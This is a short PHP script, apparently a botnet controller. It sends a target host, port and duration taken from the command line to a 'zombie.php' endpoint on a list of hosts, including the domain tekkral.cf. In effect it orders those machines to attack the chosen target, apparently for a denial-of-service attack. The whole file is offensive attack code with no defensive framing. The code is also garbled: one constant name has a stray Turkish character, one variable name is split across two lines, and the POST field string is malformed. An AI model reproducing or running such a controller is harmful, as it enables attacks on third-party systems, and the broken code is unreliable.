<?php
$zombies = ["1.1.1.1", "2.2.2.2", "tekkral.cf"];
$file_path     = "botnet/zombie.php";
$trgt_host     = $argv[1];
$trgt_port     = $argv[2];
$exec_time     = $argv[3];

$ch = curl_init();
foreach($zombies as $zombie){
    curl_setopt($ch, CURLOPT_URL,"http://".$zombie."/".$file_path);
    curl_setopt($ch, CURLOPT_POSTİ, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "host=".$trgt_
    host."$port=".$trgt_port."$exec_time".$exec_time);
    curl_exec ($ch);
}
curl_close ($ch);
?>